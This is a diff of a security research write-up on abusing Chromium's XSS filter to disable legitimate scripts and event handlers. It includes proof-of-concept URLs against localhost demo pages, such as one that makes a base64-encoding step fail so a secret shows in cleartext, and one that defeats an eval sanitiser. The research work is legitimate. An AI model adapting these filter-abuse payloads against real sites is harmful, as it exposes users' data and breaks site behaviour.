@@ -20,46 +20,54 @@ Well, it sure shouldn't be vulnerable, right ? And still, it is !
 
 Abstract
 --------
+Some browsers include anti-XSS filters... 
+Some of thoses filters disable scripts found in the GET parameters of a request...
+Some people try to bypass theses filters...
+
+We won't. Here we'll see how to abuse theses filters for maximum profit, even when there is no XSS initially !
 
 !!! (Chromium 38.0.2125.111)
 
 Proofs of concept
 -----------------
-    Story 1 : 
-        "You can safely export your password, it will be encrypted anyway (using the awesome base64)"
-            <script>var a = 'secret' ;</script>
-            <script>a=btoa(a);</script>
-            <script>alert(a);</script>
+Story 1 :"You can safely export your password, it will be encrypted anyway (using the awesome base64)"
 
-        "... Except with this URL"
-            http://localhost/xss/cleartext.html#<script>a=btoa(a);
+        <script>var a = 'secret' ;</script>
+        <script>a=btoa(a);</script>
+        <script>alert(a);</script>
 
-    Story 2 :
-        "You won't lose your work, it is saved automagically when you close the project"
-            <a onclick="alert('saved !')" href="out">
-                close this project
-            </a>
-        "Except with this URL"
-            http://localhost/xss/tags.html#onclick="alert('saved !')"
+"... Except with this URL"
+
+        http://localhost/xss/cleartext.html#<script>a=btoa(a);
 
 
-    From story 2, I guess there is a lot of fun stuff to do with angularJS apps ?
-        well, nope. ng-X doesn't trigger..
+Story 2 : "You won't lose your work, it is saved automagically when you close the project"
+
+        <a onclick="alert('saved !')" href="out">
+            close this project
+        </a>
+
+"Except with this URL"
+
+        http://localhost/xss/tags.html#onclick="alert('saved !')"
 
 
-    Story 3 :
-        <script>
-            var e=eval;
-            var eval=function(s){
-                e(s.match(/\d+/g))
-            }
-        </script>
+Story 3 : "Regexp sanitizing OP"
 
-        <button onclick="eval(document.location.hash.substr(1))">
-            Is it vulnerable ?
-        </button>
+    <script>
+        var e=eval;
+        var eval=function(s){
+            e(s.match(/\d+/g))
+        }
+    </script>
 
-        http://localhost/xss/dom.html?%3Cscript%3E%0A%20%20%20%20var%20e%3Deval%3B%0A%20%20%20%20var%20eval%3Dfunction%28s%29%7B%0A%20%20%20%20%20%20%20%20e%28s.match%28/%5Cd%2B/g%29%29%0A%20%20%20%20%7D%0A#alert(1)
+    <button onclick="eval(document.location.hash.substr(1))">
+        Is it vulnerable ?
+    </button>
+
+"...what sanitizing ?" 
+    
+    http://localhost/xss/dom.html?%3Cscript%3E%0A%20%20%20%20var%20e%3Deval%3B%0A%20%20%20%20var%20eval%3Dfunction%28s%29%7B%0A%20%20%20%20%20%20%20%20e%28s.match%28/%5Cd%2B/g%29%29%0A%20%20%20%20%7D%0A#alert(1)
 
 The filter
 ----------
@@ -106,6 +114,8 @@ Thoughts & tips
         unexpected app behavior
 
 
+    From story 2, I guess there is a lot of fun stuff to do with angularJS apps ?
+        well, nope. ng-X doesn't trigger..
 
 Data
 ----
@@ -133,4 +143,7 @@ bug ?
     http://localhost/xss/incl.html#<script src="s.js"></script>
         console says it is blocked, but really it runs.. ??
 
-papers :
+Papers :
+--------
+    
+    https://github.com/centime/AntiXSS/blob/master/Abusing_IE8s_XSS_Filters.pdf
